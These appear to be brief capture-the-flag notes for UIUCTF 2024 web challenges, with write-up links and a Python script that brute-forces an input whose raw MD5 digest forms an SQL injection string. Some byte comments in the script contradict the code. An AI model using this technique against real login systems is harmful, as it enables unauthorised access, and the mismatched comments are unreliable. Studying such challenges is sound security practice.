## Web 
<https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/>
<https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/>
<https://chuajianshen.github.io/2024/06/29/UIU2024>

```plaintext
Code to bruteforce the hash to get the content which can lead to SQL injection due the server interpreting the values, in this case --> as RAW MD5 hash
```
```python
import hashlib
import string
import itertools

# Criteria for the hash
def check_hash(hash_bytes):
    return (hash_bytes[-1] in range(0x31, 0x3A) and  # Last byte: 0x30-0x39
            hash_bytes[-2] == 0x27 and              # Second to last byte: 0x20
            hash_bytes[-3] in [0x52, 0x72] and      # Third to last byte: 0x52 or 0x72
            hash_bytes[-4] in [0x4f, 0x6f] and      # Fourth to last byte: 0x4f or 0x6f
            hash_bytes[-5] == 0x27)                 # Fifth to last byte: 0x27


# Brute force search
def brute_force_md5():
    chars = "qwertyuiopasdfghjklzxcvbnmWERTYUIOPASDFGHJKLZXCVBNM1234567890"
    for length in range(1, 9):  # Adjust length as necessary
        for s in itertools.product(chars, repeat=length):
            candidate = ''.join(s)
            hash_bytes = hashlib.md5(candidate.encode()).digest()
            if check_hash(hash_bytes):
                print(f"Match found: {candidate}")
                return candidate
        print(f"Tried all of length {length}")
    print("No match found.")
    return None

# Run the brute force search
brute_force_md5()
```

